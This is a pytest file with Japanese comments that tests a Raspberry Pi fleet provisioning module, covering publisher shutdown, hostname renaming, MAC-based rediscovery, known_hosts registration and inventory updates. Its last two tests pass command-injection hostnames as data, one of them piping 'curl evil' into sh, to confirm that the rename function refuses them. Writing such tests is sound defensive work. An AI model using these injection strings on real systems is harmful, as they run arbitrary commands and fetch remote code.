"""登録6工程の検証。

工程1(送信停止)を最初に置くのは、SDクローンだと MQTT の client_id が衝突して
2台が互いを蹴り合うため。この競合を止めるのが STA_NO の是正より先に来る。

対象は必ずIPで指定する。ホスト名で指定するとクローン2台のどちらを操作しているか
判別できない。
"""
from fleet_ui.provision import (
    add_to_inventory,
    blank_sta_no,
    register_host_key,
    rename_and_reboot,
    stop_publisher,
    wait_for_return,
)


def _recorder(fail_on=None, out=""):
    calls = []

    def run(cmd):
        calls.append(cmd)
        if fail_on and any(fail_on in c for c in cmd):
            raise RuntimeError("boom")
        return out
    run.calls = calls
    return run


def test_stop_publisher_targets_the_ip_not_a_hostname():
    r = _recorder()
    assert stop_publisher("10.42.0.194", runner=r).ok
    joined = " ".join(" ".join(c) for c in r.calls)
    assert "pi@10.42.0.194" in joined
    assert "stop child-csv-to-mqtt" in joined


def test_blank_sta_no_backs_up_first():
    r = _recorder()
    assert blank_sta_no("10.42.0.194", runner=r).ok
    joined = " ".join(" ".join(c) for c in r.calls)
    assert "clone-backup" in joined


def test_rename_updates_hostname_and_hosts_then_reboots():
    r = _recorder()
    assert rename_and_reboot("10.42.0.194", "pizero2w-3", runner=r).ok
    joined = " ".join(" ".join(c) for c in r.calls)
    assert "set-hostname pizero2w-3" in joined
    assert "/etc/hosts" in joined
    assert "reboot" in joined


def test_rename_does_not_substitute_by_the_old_hostname():
    """旧ホスト名で置換してはいけない。

    `\\b` はハイフンの手前でも単語境界になるため、旧名 pizero2w の置換が
    pizero2w-2 の行にも当たり pizero2w-3-2 のように別ホストの行を壊す。
    127.0.1.1 行を丸ごと差し替える形にすれば旧名に依存せず、set-hostname との
    順序も問題にならない。
    """
    r = _recorder()
    rename_and_reboot("10.42.0.194", "pizero2w-3", runner=r)
    cmd = r.calls[0][-1]
    assert "$(hostname)" not in cmd
    assert "127.0.1.1" in cmd


def test_rename_appends_the_hosts_line_when_missing():
    """127.0.1.1 行が無い機体でも名前解決が壊れたままにならないこと。"""
    r = _recorder()
    rename_and_reboot("10.42.0.194", "pizero2w-3", runner=r)
    cmd = r.calls[0][-1]
    assert "tee -a /etc/hosts" in cmd


def test_failed_step_returns_not_ok_instead_of_raising():
    r = _recorder(fail_on="child-csv-to-mqtt")
    res = stop_publisher("10.42.0.194", runner=r)
    assert res.ok is False
    assert res.message


def test_wait_for_return_finds_the_device_by_mac_after_reboot():
    """再起動でIPが変わり得るのでMACで引き直す。"""
    seen = {"n": 0}

    def runner(cmd):
        seen["n"] += 1
        if seen["n"] < 3:
            return ""          # まだ戻っていない
        return "10.42.0.77 lladdr 88:a2:9e:30:5e:46 REACHABLE\n"

    res = wait_for_return("88:a2:9e:30:5e:46", timeout_s=30,
                          runner=runner, sleeper=lambda s: None)
    assert res.ok
    assert "10.42.0.77" in res.message


def test_wait_for_return_times_out_cleanly():
    res = wait_for_return("88:a2:9e:30:5e:46", timeout_s=4,
                          runner=lambda cmd: "", sleeper=lambda s: None)
    assert res.ok is False


def test_register_host_key_appends_to_known_hosts(tmp_path):
    """本物の ~/.ssh/known_hosts を汚さないよう、必ず known_hosts を渡すこと。"""
    kh = tmp_path / "known_hosts"
    kh.write_text("", encoding="utf-8")
    r = _recorder(out="pizero2w-3.local ssh-ed25519 AAAA\n")
    assert register_host_key("pizero2w-3.local", runner=r, known_hosts=kh).ok
    assert any(c[0] == "ssh-keyscan" for c in r.calls)
    assert "pizero2w-3.local" in kh.read_text(encoding="utf-8")


def test_register_host_key_writes_nothing_when_keyscan_is_empty(tmp_path):
    """鍵が取れなかったのに空行を足すと known_hosts が汚れるだけ。"""
    kh = tmp_path / "known_hosts"
    kh.write_text("既存の行\n", encoding="utf-8")
    register_host_key("nowhere.local", runner=_recorder(out=""), known_hosts=kh)
    assert kh.read_text(encoding="utf-8") == "既存の行\n"


def test_add_to_inventory_appends_the_entry(tmp_path):
    f = tmp_path / "children.conf"
    f.write_text("# 見出し\nzero2\n", encoding="utf-8")
    assert add_to_inventory("pizero2w-3.local", path=f).ok
    assert f.read_text(encoding="utf-8").splitlines()[-1] == "pizero2w-3.local"


def test_add_to_inventory_is_idempotent(tmp_path):
    """二重登録すると同じ子へ二重配布してしまう。"""
    f = tmp_path / "children.conf"
    f.write_text("zero2\npizero2w-3.local\n", encoding="utf-8")
    res = add_to_inventory("pizero2w-3.local", path=f)
    assert res.ok
    assert f.read_text(encoding="utf-8").count("pizero2w-3.local") == 1


def test_rename_refuses_shell_metacharacters():
    """new_hostname は sed / printf へ素で埋め込まれる。呼び出し側の検証に
    依存せず、この関数自身で弾くこと。

    `x/"; touch /tmp/PWNED; echo "` は sed の二重引用符から抜けて子の上で
    任意のコマンドを実行できてしまう。
    """
    r = _recorder()
    res = rename_and_reboot("10.42.0.194", 'x/"; touch /tmp/PWNED; echo "', runner=r)
    assert res.ok is False
    assert r.calls == []          # 一切実行しない


def test_rename_refuses_single_quote_injection():
    r = _recorder()
    assert rename_and_reboot("10.42.0.194", "a'; curl evil|sh; echo '", runner=r).ok is False
    assert r.calls == []
